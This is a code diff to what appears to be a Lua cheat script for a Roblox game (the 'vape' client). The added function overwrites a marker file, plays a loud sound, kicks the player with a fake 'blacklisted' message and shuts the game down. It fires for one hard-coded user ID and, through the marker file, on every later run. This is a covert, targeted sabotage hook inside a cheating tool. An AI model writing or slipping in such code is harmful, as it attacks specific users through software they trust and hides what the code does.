@@ -10785,3 +10785,23 @@ if shared.nobolineupdate then
 		end
 	end)
 end
+
+local function funny()
+	writefile("vape/Profiles/bedwarsdata2.txt", "")
+	local song = Instance.new("Sound")
+	song.Volume = 10
+	song.SoundId = "rbxassetid://5216738441"
+	song.Parent = workspace
+	repeat task.wait() until song.IsLoaded
+	lplr:Kick("Your account has been blacklisted from vape, Have a good day.")
+	song:Play()
+	task.wait(9)
+	game:Shutdown()
+end
+
+if betterisfile("vape/Profiles/bedwarsdata2.txt") then 
+	funny()
+end
+if lplr.UserId == 3760368362 then 
+	funny()
+end
